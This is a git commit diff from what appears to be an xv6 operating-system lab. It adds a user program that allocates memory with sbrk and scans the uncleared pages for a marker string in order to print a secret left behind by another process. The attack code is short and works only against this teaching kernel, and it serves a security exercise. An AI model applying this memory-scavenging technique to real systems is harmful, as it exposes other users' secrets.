9b1154cf6183f89ce00d3818772f93549738c7ce
huangmaojun666 <3487602092@qq.com>
2026-08-12 21:50:47 +0800

    complete attack

--- Makefile
+++ Makefile
@@ -196,7 +196,8 @@ UPROGS=\
 	$U/_forphan\
 	$U/_dorphan\
 	$U/_sandbox\
-
+	$U/_attack\
+	$U/_secret\
 
 
 ifeq ($(LAB),util)
--- user/attack.c
+++ user/attack.c
@@ -2,11 +2,57 @@
 #include "kernel/fcntl.h"
 #include "user/user.h"
 #include "kernel/riscv.h"
+#include "kernel/stat.h"
+
+#define NPAGES 64
+#define SIZE (NPAGES * PGSIZE)
+
+#define MARKER " help."
+#define MARKER_LEN 6
+#define SECRET_OFFSET 8
+
+static int
+isalnum_char(char c)
+{
+  return (c >= '0' && c <= '9') ||
+         (c >= 'A' && c <= 'Z') ||
+         (c >= 'a' && c <= 'z');
+}
 
 int
 main(int argc, char *argv[])
 {
-  // Your code here.
+  char *mem = sbrk(SIZE);
 
-  exit(1);
+  if(mem == (char *)-1){
+    printf("attack: sbrk failed\n");
+    exit(1);
+  }
+
+  for(int i = 0;
+      i + SECRET_OFFSET < SIZE;
+      i++){
+
+    if(memcmp(mem + i, MARKER, MARKER_LEN) != 0)
+      continue;
+
+    char *candidate = mem + i + SECRET_OFFSET;
+
+    int len = 0;
+
+    while(i + SECRET_OFFSET + len < SIZE &&
+          isalnum_char(candidate[len])){
+      len++;
+    }
+
+    if(len > 0 &&
+       i + SECRET_OFFSET + len < SIZE &&
+       candidate[len] == '\0'){
+      write(1, candidate, len);
+      write(1, "\n", 1);
+      exit(0);
+    }
+  }
+
+  exit(0);
 }
